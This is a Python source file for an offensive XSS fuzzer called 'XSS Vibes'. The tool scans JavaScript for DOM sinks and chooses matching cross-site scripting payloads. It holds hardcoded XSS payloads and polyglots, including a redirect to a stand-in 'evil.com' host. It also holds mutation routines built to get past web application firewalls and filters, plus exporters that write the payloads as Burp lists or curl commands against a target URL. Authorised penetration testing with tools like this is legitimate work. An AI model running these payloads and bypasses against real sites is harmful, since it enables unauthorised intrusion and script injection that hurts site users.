#!/usr/bin/env python3
"""
XSS Vibes - AI DOM Fuzzer
Automatically selects optimal fuzzing payloads for useEffect, shadowRoot, eval, and other DOM contexts
"""

import json
import re
import random
from typing import Dict, List, Optional, Tuple
from pathlib import Path


class AIDOMFuzzer:
    def __init__(self, payload_data_dir: Optional[str] = None):
        self.payload_data_dir = payload_data_dir or str(Path(__file__).parent / "data")
        self.context_patterns = self._load_context_patterns()
        self.payloads = self._load_payloads()
        self.mutation_strategies = self._init_mutation_strategies()

    def _load_context_patterns(self) -> Dict:
        """Load DOM context detection patterns"""
        return {
            "useEffect": {
                "patterns": [
                    r"useEffect\s*\(\s*\(\s*\)\s*=>\s*\{([^}]+)\}",
                    r"useEffect\s*\(\s*function\s*\(\s*\)\s*\{([^}]+)\}",
                    r"useEffect\s*\([^,]+,\s*\[([^\]]*)\]",
                    r"React\.useEffect",
                ],
                "payload_types": ["react_hooks", "jsx_injection", "dom_manipulation"],
                "priority": 9,
                "description": "React useEffect hook injection",
            },
            "shadowRoot": {
                "patterns": [
                    r"attachShadow\s*\(\s*\{[^}]*mode:\s*['\"]open['\"]",
                    r"\.shadowRoot",
                    r"shadowRoot\.innerHTML",
                    r"shadowRoot\.appendChild",
                    r"customElements\.define",
                ],
                "payload_types": ["web_components", "shadow_dom", "custom_elements"],
                "priority": 8,
                "description": "Shadow DOM injection",
            },
            "eval_contexts": {
                "patterns": [
                    r"eval\s*\(",
                    r"Function\s*\(",
                    r"setTimeout\s*\([^,]*['\"`]",
                    r"setInterval\s*\([^,]*['\"`]",
                    r"execScript",
                    r"new\s+Function",
                ],
                "payload_types": [
                    "eval_injection",
                    "dynamic_execution",
                    "code_injection",
                ],
                "priority": 10,
                "description": "Dynamic code execution",
            },
            "innerHTML_sinks": {
                "patterns": [
                    r"\.innerHTML\s*=",
                    r"\.outerHTML\s*=",
                    r"insertAdjacentHTML",
                    r"document\.write",
                    r"document\.writeln",
                ],
                "payload_types": ["dom_sinks", "html_injection", "basic_xss"],
                "priority": 9,
                "description": "HTML injection sinks",
            },
            "event_handlers": {
                "patterns": [
                    r"addEventListener\s*\(",
                    r"on\w+\s*=",
                    r"onclick|onload|onerror|onmouseover|onmouseout",
                    r"dispatchEvent",
                    r"createEvent",
                ],
                "payload_types": ["event_injection", "dom_events", "handler_injection"],
                "priority": 7,
                "description": "Event handler injection",
            },
            "attribute_sinks": {
                "patterns": [
                    r"setAttribute\s*\(",
                    r"\.src\s*=",
                    r"\.href\s*=",
                    r"\.action\s*=",
                    r"\.data\s*=",
                    r"\.value\s*=",
                ],
                "payload_types": [
                    "attribute_injection",
                    "url_injection",
                    "data_injection",
                ],
                "priority": 6,
                "description": "Attribute injection",
            },
            "template_contexts": {
                "patterns": [
                    r"{{.*}}",
                    r"<%.*%>",
                    r"template\s*literal",
                    r"`.*\$\{.*\}.*`",
                    r"handlebars|mustache",
                    r"v-html|ng-bind-html",
                ],
                "payload_types": [
                    "template_injection",
                    "expression_injection",
                    "interpolation",
                ],
                "priority": 8,
                "description": "Template injection",
            },
            "postMessage": {
                "patterns": [
                    r"postMessage\s*\(",
                    r"addEventListener\s*\(\s*['\"]message['\"]",
                    r"window\.parent\.postMessage",
                    r"iframe.*contentWindow",
                    r"event\.data",
                ],
                "payload_types": [
                    "postmessage_injection",
                    "iframe_injection",
                    "cross_frame",
                ],
                "priority": 7,
                "description": "PostMessage injection",
            },
            "fetch_contexts": {
                "patterns": [
                    r"fetch\s*\(",
                    r"XMLHttpRequest",
                    r"\.ajax\s*\(",
                    r"axios\.",
                    r"Response\.text\(\)",
                    r"response\.json\(\)",
                ],
                "payload_types": [
                    "response_injection",
                    "ajax_injection",
                    "json_injection",
                ],
                "priority": 6,
                "description": "Fetch/AJAX response injection",
            },
            "storage_contexts": {
                "patterns": [
                    r"localStorage\.",
                    r"sessionStorage\.",
                    r"\.getItem\s*\(",
                    r"\.setItem\s*\(",
                    r"indexedDB",
                    r"WebSQL",
                ],
                "payload_types": [
                    "storage_injection",
                    "persistence_xss",
                    "client_storage",
                ],
                "priority": 5,
                "description": "Storage-based injection",
            },
        }

    def _load_payloads(self) -> Dict:
        """Load categorized payloads"""
        payload_files = [
            "payloads.json",
            "polyglot_payloads.json",
            "payloads_enhanced.json",
        ]

        payloads = {}

        for filename in payload_files:
            file_path = Path(self.payload_data_dir) / filename
            if file_path.exists():
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        data = json.load(f)

                        # Handle different data formats
                        if filename == "payloads.json":
                            # Standard format: list of payload objects
                            if isinstance(data, list):
                                basic_payloads = [
                                    p.get("Payload", str(p))
                                    for p in data
                                    if p.get("Payload")
                                ]
                                payloads["basic_xss"] = basic_payloads[
                                    :100
                                ]  # Limit for performance

                                # Categorize by level
                                eval_payloads = [
                                    p.get("Payload")
                                    for p in data
                                    if "script" in str(p.get("Payload", "")).lower()
                                    or "eval" in str(p.get("Payload", "")).lower()
                                ]
                                payloads["eval_injection"] = eval_payloads[:50]

                                dom_payloads = [
                                    p.get("Payload")
                                    for p in data
                                    if "innerHTML" in str(p.get("Payload", ""))
                                    or "document.write" in str(p.get("Payload", ""))
                                ]
                                payloads["dom_manipulation"] = dom_payloads[:50]

                        elif filename == "polyglot_payloads.json":
                            if isinstance(data, dict) and "payloads" in data:
                                polyglots = data["payloads"]
                                if isinstance(polyglots, list):
                                    payloads["polyglots"] = polyglots[:20]
                            elif isinstance(data, list):
                                payloads["polyglots"] = data[:20]

                        elif filename == "payloads_enhanced.json":
                            if isinstance(data, dict):
                                # Enhanced categorization for better coverage
                                category_mapping = {
                                    "react": "react_hooks",
                                    "angular": "spa_framework",
                                    "vue": "spa_framework",
                                    "dom": "dom_manipulation",
                                    "shadow": "shadow_dom",
                                    "web_components": "web_components",
                                    "service_worker": "service_worker",
                                    "jsonp": "jsonp",
                                    "iframe": "iframe_injection",
                                    "postmessage": "postmessage_injection",
                                    "eval": "eval_injection",
                                    "function": "eval_injection",
                                    "template": "template_injection",
                                    "attribute": "attribute_injection",
                                    "event": "event_injection",
                                    "fetch": "response_injection",
                                    "ajax": "ajax_injection",
                                    "storage": "storage_injection",
                                    "waf_bypass": "waf_bypass",
                                    "unicode": "unicode_bypass",
                                    "encoding": "encoding_bypass",
                                }

                                for category, category_payloads in data.items():
                                    if isinstance(category_payloads, list):
                                        mapped_category = category_mapping.get(
                                            category.lower(), category
                                        )
                                        payloads[mapped_category] = category_payloads[
                                            :30
                                        ]

                except Exception as e:
                    print(f"Warning: Could not load {filename}: {e}")

        # Add some hardcoded payloads for specific contexts
        payloads.update(
            {
                "react_hooks": payloads.get("react_hooks", [])
                + [
                    "useEffect(() => alert(1), [])",
                    "() => { alert(1) }",
                    "React.createElement('script', null, 'alert(1)')",
                ],
                "shadow_dom": [
                    "<template><script>alert(1)</script></template>",
                    "shadowRoot.innerHTML = '<script>alert(1)</script>'",
                    "<slot><script>alert(1)</script></slot>",
                ],
                "web_components": [
                    "customElements.define('x', class extends HTMLElement { connectedCallback() { alert(1) } })",
                    "<x-custom onload=alert(1)></x-custom>",
                    "this.attachShadow({mode:'open'}).innerHTML='<script>alert(1)</script>'",
                ],
                "jsonp": [
                    "callback=alert",
                    "jsonp_callback(alert(1))",
                    "window['alert'](1)",
                ],
                "service_worker": [
                    "self.addEventListener('fetch', () => alert(1))",
                    "importScripts('data:text/javascript,alert(1)')",
                    "caches.open('v1').then(() => alert(1))",
                ],
            }
        )

        # Ensure we have some basic payloads
        if not payloads:
            payloads = self._get_default_payloads()

        return payloads

    def _get_default_payloads(self) -> Dict:
        """Default payloads if files are not available"""
        return {
            "basic_xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'\"><script>alert(1)</script>",
            ],
            "eval_injection": [
                "alert(1)",
                "console.log('XSS')",
                "document.cookie",
                "window.location='http://evil.com'",
                "eval('alert(1)')",
            ],
            "react_hooks": [
                "useEffect(() => alert(1), [])",
                "() => { alert(1) }",
                "React.createElement('script', null, 'alert(1)')",
                "dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}",
            ],
            "shadow_dom": [
                "<template><script>alert(1)</script></template>",
                "shadowRoot.innerHTML = '<script>alert(1)</script>'",
                "<slot><script>alert(1)</script></slot>",
            ],
            "polyglots": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
                "'\"><img/src/onerror=alert(String.fromCharCode(88,83,83))>",
                '"><svg/onload=alert(/XSS/)>',
            ],
        }

    def _init_mutation_strategies(self) -> Dict:
        """Initialize payload mutation strategies"""
        return {
            "case_variation": {
                "description": "Vary case to bypass filters",
                "mutations": [
                    lambda p: p.upper(),
                    lambda p: p.lower(),
                    lambda p: "".join(
                        c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
                    ),
                    lambda p: "".join(
                        c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(p)
                    ),
                ],
            },
            "encoding": {
                "description": "Apply various encodings",
                "mutations": [
                    lambda p: "".join(f"&#x{ord(c):x};" for c in p),
                    lambda p: "".join(f"&#{ord(c)};" for c in p),
                    lambda p: "".join(f"%{ord(c):02x}" for c in p),
                    lambda p: p.encode("unicode-escape").decode("ascii"),
                ],
            },
            "obfuscation": {
                "description": "Obfuscate with comments and whitespace",
                "mutations": [
                    lambda p: p.replace("(", "/**/()").replace(")", ")/**/"),
                    lambda p: p.replace(" ", "/**/"),
                    lambda p: p.replace("alert", "ale/**/rt"),
                    lambda p: p.replace("<", "/**/<").replace(">", ">/**/"),
                ],
            },
            "context_breaking": {
                "description": "Add context-breaking characters",
                "mutations": [
                    lambda p: f"'>{p}",
                    lambda p: f'"{p}',
                    lambda p: f"</script>{p}",
                    lambda p: f"-->{p}",
                    lambda p: f"]){p}",
                ],
            },
            "waf_bypass": {
                "description": "Advanced WAF bypass techniques",
                "mutations": [
                    # Null byte injection
                    lambda p: p.replace("script", "scr\x00ipt"),
                    lambda p: p.replace("javascript", "java\tscript"),
                    # String concatenation
                    lambda p: p.replace("alert", 'window["ale"+"rt"]'),
                    lambda p: p.replace("alert", 'eval("ale"+"rt")'),
                    lambda p: p.replace("alert", 'Function("ale"+"rt")()'),
                    # Character encoding
                    lambda p: p.replace("(", "\\x28").replace(")", "\\x29"),
                    lambda p: p.replace(
                        "script", "\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074"
                    ),
                    # Alternative execution contexts
                    lambda p: p.replace("alert(1)", "setTimeout(alert,0,1)"),
                    lambda p: p.replace("alert(1)", "setInterval(alert,0,1)"),
                    lambda p: p.replace("alert(1)", "(alert)(1)"),
                    # DOM clobbering
                    lambda p: f"<form><input name=attributes><img src=x onerror='{p}'>",
                    lambda p: f"<iframe srcdoc='&lt;script&gt;{p}&lt;/script&gt;'>",
                    # Template literal bypass
                    lambda p: p.replace("alert", "`${alert`"),
                    lambda p: p.replace("alert(1)", "alert`1`"),
                    # Protocol mutations
                    lambda p: p.replace("javascript:", "JavaScript:"),
                    lambda p: p.replace("javascript:", "JAVASCRIPT:"),
                    lambda p: p.replace("javascript:", "vbscript:"),
                    # Event handler variations
                    lambda p: p.replace("onerror", "onError"),
                    lambda p: p.replace("onload", "onLoad"),
                    lambda p: p.replace("onclick", "onClick"),
                ],
            },
            "unicode_bypass": {
                "description": "Unicode normalization bypass",
                "mutations": [
                    # Unicode overrides
                    lambda p: f"\\u202e{p}\\u202d",
                    lambda p: f"\\u2066{p}\\u2069",
                    # Alternative unicode representations
                    lambda p: p.replace("script", "\\u0073cript"),
                    lambda p: p.replace("alert", "\\u0061lert"),
                    # Combining characters
                    lambda p: "a\\u0300lert(1)" if "alert" in p else p,
                    lambda p: "s\\u0300cript" if "script" in p else p,
                ],
            },
            "advanced_encoding": {
                "description": "Advanced encoding techniques",
                "mutations": [
                    # Double encoding
                    lambda p: "".join(f"%25{ord(c):02x}" for c in p),
                    # Mixed encoding
                    lambda p: "".join(
                        f"&#x{ord(c):x};" if i % 2 == 0 else f"&#{ord(c)};"
                        for i, c in enumerate(p)
                    ),
                    # Base64 in data URL
                    lambda p: f"data:text/html;base64,{__import__('base64').b64encode(p.encode()).decode()}",
                    # Javascript scheme with encoding
                    lambda p: f"javascript:{p.replace(' ', '%20')}",
                    # CSS expression
                    lambda p: f"expression({p})" if "alert" in p else p,
                ],
            },
        }

    def detect_contexts(self, content: str) -> List[Dict]:
        """Detect DOM contexts in content"""
        detected_contexts = []

        for context_name, context_info in self.context_patterns.items():
            matches = []
            for pattern in context_info["patterns"]:
                found = re.findall(
                    pattern, content, re.IGNORECASE | re.MULTILINE | re.DOTALL
                )
                matches.extend(found)

            if matches:
                detected_contexts.append(
                    {
                        "context": context_name,
                        "matches": len(matches),
                        "priority": context_info["priority"],
                        "payload_types": context_info["payload_types"],
                        "description": context_info["description"],
                        "samples": matches[:3],  # First 3 matches
                    }
                )

        # Sort by priority
        detected_contexts.sort(key=lambda x: x["priority"], reverse=True)
        return detected_contexts

    def select_payloads(
        self,
        contexts: List[Dict],
        max_payloads: int = 50,
        mutation_filter: Optional[List[str]] = None,
    ) -> List[Dict]:
        """Select optimal payloads based on detected contexts"""
        selected_payloads = []

        if not contexts:
            # Default selection for unknown contexts
            contexts = [
                {
                    "context": "generic",
                    "payload_types": ["basic_xss", "polyglots"],
                    "priority": 5,
                }
            ]

        for context in contexts:
            context_payloads = []

            # Get payloads for this context
            for payload_type in context["payload_types"]:
                if payload_type in self.payloads:
                    payloads = self.payloads[payload_type]
                    if isinstance(payloads, list):
                        context_payloads.extend(payloads)
                    elif isinstance(payloads, dict):
                        # Flatten nested payload structure
                        for category, payload_list in payloads.items():
                            if isinstance(payload_list, list):
                                context_payloads.extend(payload_list)

            # Add context info to payloads
            for payload in context_payloads:
                selected_payloads.append(
                    {
                        "payload": payload,
                        "context": context["context"],
                        "priority": context["priority"],
                        "description": context.get("description", "Unknown context"),
                        "original": True,
                    }
                )

        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload_info in selected_payloads:
            payload_str = str(payload_info["payload"])  # Ensure it's a string
            if payload_str not in seen:
                seen.add(payload_str)
                # Ensure payload is stored as string
                payload_info["payload"] = payload_str
                unique_payloads.append(payload_info)

        # Limit to max_payloads but include mutations
        base_count = min(len(unique_payloads), max_payloads // 2)
        base_payloads = unique_payloads[:base_count]

        # Add mutations
        mutated_payloads = self._generate_mutations(
            base_payloads, max_payloads - base_count, mutation_filter
        )

        return base_payloads + mutated_payloads

    def _generate_mutations(
        self,
        base_payloads: List[Dict],
        max_mutations: int,
        mutation_filter: Optional[List[str]] = None,
    ) -> List[Dict]:
        """Generate payload mutations"""
        mutations = []

        # Filter mutation strategies if specified
        strategies_to_use = self.mutation_strategies
        if mutation_filter:
            strategies_to_use = {
                k: v
                for k, v in self.mutation_strategies.items()
                if k in mutation_filter
            }

        for strategy_name, strategy in strategies_to_use.items():
            for payload_info in base_payloads:
                if len(mutations) >= max_mutations:
                    break

                original_payload = payload_info["payload"]

                # Try each mutation in the strategy
                for mutation_func in strategy["mutations"]:
                    try:
                        mutated = mutation_func(original_payload)
                        if (
                            mutated != original_payload
                        ):  # Only add if actually different
                            mutations.append(
                                {
                                    "payload": mutated,
                                    "context": payload_info["context"],
                                    "priority": payload_info["priority"]
                                    - 1,  # Slightly lower priority
                                    "description": f"{payload_info['description']} ({strategy['description']})",
                                    "original": False,
                                    "mutation_strategy": strategy_name,
                                }
                            )
                            if len(mutations) >= max_mutations:
                                break
                    except Exception as e:
                        # Log specific mutation failures for debugging
                        import logging

                        logging.debug(
                            f"Mutation failed for strategy {strategy_name}: {e}"
                        )
                        continue  # Skip failed mutations

                if len(mutations) >= max_mutations:
                    break

        return mutations

    def fuzz_content(
        self,
        content: str,
        max_payloads: int = 50,
        context_filter: Optional[List[str]] = None,
        mutation_filter: Optional[List[str]] = None,
    ) -> Dict:
        """Analyze content and select optimal fuzzing payloads"""
        # Detect contexts
        contexts = self.detect_contexts(content)

        # Filter contexts if specified
        if context_filter:
            contexts = [ctx for ctx in contexts if ctx["context"] in context_filter]

        # Select payloads with mutation filter
        selected_payloads = self.select_payloads(
            contexts, max_payloads, mutation_filter
        )

        # Calculate coverage score
        coverage_score = self._calculate_coverage(contexts, selected_payloads)

        return {
            "detected_contexts": contexts,
            "selected_payloads": selected_payloads,
            "payload_count": len(selected_payloads),
            "coverage_score": coverage_score,
            "recommendations": self._generate_recommendations(
                contexts, selected_payloads
            ),
        }

    def _calculate_coverage(self, contexts: List[Dict], payloads: List[Dict]) -> float:
        """Calculate fuzzing coverage score"""
        if not contexts:
            return 50.0  # Base score for generic fuzzing

        total_priority = sum(ctx["priority"] for ctx in contexts)
        covered_priority = 0

        payload_contexts = set(p["context"] for p in payloads)

        for context in contexts:
            if context["context"] in payload_contexts:
                covered_priority += context["priority"]

        coverage = (
            (covered_priority / total_priority) * 100 if total_priority > 0 else 0
        )
        return min(coverage, 100.0)

    def _generate_recommendations(
        self, contexts: List[Dict], payloads: List[Dict]
    ) -> List[str]:
        """Generate fuzzing recommendations"""
        recommendations = []

        if not contexts:
            recommendations.append(
                "🎯 No specific contexts detected - using generic XSS payloads"
            )
            recommendations.append(
                "💡 Try analyzing more specific code samples for better targeting"
            )
            return recommendations

        # Context-specific recommendations
        high_priority_contexts = [ctx for ctx in contexts if ctx["priority"] >= 8]
        if high_priority_contexts:
            recommendations.append(
                f"🚨 HIGH PRIORITY: Focus on {len(high_priority_contexts)} critical contexts"
            )
            for ctx in high_priority_contexts[:3]:
                recommendations.append(f"  🎯 {ctx['context']}: {ctx['description']}")

        # Mutation recommendations
        mutation_count = len([p for p in payloads if not p.get("original", True)])
        if mutation_count > 0:
            recommendations.append(
                f"🔀 Generated {mutation_count} payload mutations for bypass attempts"
            )

        # Coverage recommendations
        contexts_with_payloads = set(p["context"] for p in payloads)
        contexts_without_payloads = [
            ctx for ctx in contexts if ctx["context"] not in contexts_with_payloads
        ]

        if contexts_without_payloads:
            recommendations.append(
                f"⚠️  {len(contexts_without_payloads)} contexts have no specific payloads"
            )
            recommendations.append(
                "💡 Consider adding custom payloads for these contexts"
            )

        # Fuzzing strategy recommendations
        eval_contexts = [ctx for ctx in contexts if "eval" in ctx["context"].lower()]
        if eval_contexts:
            recommendations.append(
                "⚡ Detected eval contexts - prioritize code injection payloads"
            )

        react_contexts = [ctx for ctx in contexts if "useEffect" in ctx["context"]]
        if react_contexts:
            recommendations.append(
                "⚛️  React hooks detected - test component lifecycle injection"
            )

        shadow_contexts = [
            ctx for ctx in contexts if "shadow" in ctx["context"].lower()
        ]
        if shadow_contexts:
            recommendations.append("🌑 Shadow DOM detected - test encapsulation bypass")

        return recommendations

    def export_payloads(
        self, fuzz_result: Dict, format: str = "json", output_file: Optional[str] = None
    ) -> str:
        """Export selected payloads in various formats"""
        payloads = fuzz_result["selected_payloads"]

        if format.lower() == "json":
            output = json.dumps(
                {
                    "metadata": {
                        "total_payloads": len(payloads),
                        "contexts": len(fuzz_result["detected_contexts"]),
                        "coverage_score": fuzz_result["coverage_score"],
                    },
                    "payloads": payloads,
                },
                indent=2,
                ensure_ascii=False,
            )

        elif format.lower() == "txt":
            output = "# XSS Vibes - AI DOM Fuzz Payloads\n\n"
            for i, payload_info in enumerate(payloads, 1):
                output += f"{i}. {payload_info['payload']}\n"
                output += f"   Context: {payload_info['context']}\n"
                output += f"   Priority: {payload_info['priority']}\n\n"

        elif format.lower() == "burp":
            # Burp Suite format
            output = "# Burp Suite Payload List\n"
            output += "# Generated by XSS Vibes AI DOM Fuzzer\n\n"
            for payload_info in payloads:
                output += f"{payload_info['payload']}\n"

        elif format.lower() == "curl":
            # cURL commands
            output = "#!/bin/bash\n"
            output += "# XSS Vibes - cURL Test Commands\n\n"
            for i, payload_info in enumerate(payloads, 1):
                encoded_payload = payload_info["payload"].replace("'", "\\'")
                output += f"# Test {i}: {payload_info['context']}\n"
                output += f"curl -X POST 'TARGET_URL' -d 'param={encoded_payload}'\n\n"

        else:
            raise ValueError(f"Unsupported format: {format}")

        if output_file:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(output)

        return output


def main():
    import argparse

    parser = argparse.ArgumentParser(description="XSS Vibes - AI DOM Fuzzer")
    parser.add_argument("--input", "-i", help="Input file to analyze")
    parser.add_argument("--content", "-c", help="Content string to analyze")
    parser.add_argument(
        "--max-payloads",
        "-m",
        type=int,
        default=50,
        help="Maximum payloads to generate",
    )
    parser.add_argument(
        "--contexts",
        help="Comma-separated list of contexts to focus on (e.g., react_hooks,shadow_dom)",
    )
    parser.add_argument(
        "--mutations",
        help="Comma-separated list of mutation strategies (e.g., waf_bypass,unicode_bypass)",
    )
    parser.add_argument(
        "--format",
        "-f",
        choices=["json", "txt", "burp", "curl"],
        default="json",
        help="Output format",
    )
    parser.add_argument("--output", "-o", help="Output file")
    parser.add_argument("--data-dir", "-d", help="Payload data directory")

    args = parser.parse_args()

    # Get content to analyze
    if args.input:
        with open(args.input, "r", encoding="utf-8") as f:
            content = f.read()
    elif args.content:
        content = args.content
    else:
        print("❌ No input provided. Use --input or --content")
        return

    # Initialize fuzzer
    fuzzer = AIDOMFuzzer(args.data_dir)

    print("🧠 XSS Vibes - AI DOM Fuzzer")
    print("=" * 50)

    # Parse filters
    context_filter = args.contexts.split(",") if args.contexts else None
    mutation_filter = args.mutations.split(",") if args.mutations else None

    # Analyze content
    result = fuzzer.fuzz_content(
        content, args.max_payloads, context_filter, mutation_filter
    )

    # Show summary
    print(f"📊 Analysis Results:")
    print(f"   Detected contexts: {len(result['detected_contexts'])}")
    print(f"   Selected payloads: {result['payload_count']}")
    print(f"   Coverage score: {result['coverage_score']:.1f}%")

    # Show top contexts
    if result["detected_contexts"]:
        print(f"\n🎯 Top Contexts:")
        for ctx in result["detected_contexts"][:5]:
            print(
                f"   {ctx['context']} (priority: {ctx['priority']}, matches: {ctx['matches']})"
            )

    # Show recommendations
    print(f"\n💡 Recommendations:")
    for rec in result["recommendations"]:
        print(f"   {rec}")

    # Export results
    output = fuzzer.export_payloads(result, args.format, args.output)

    if args.output:
        print(f"\n📄 Results saved to: {args.output}")
    else:
        print(f"\n📋 Generated Payloads ({args.format}):")
        print("=" * 50)
        if len(output) > 2000:  # Truncate long output
            print(output[:2000] + "\n... (truncated)")
        else:
            print(output)


if __name__ == "__main__":
    main()
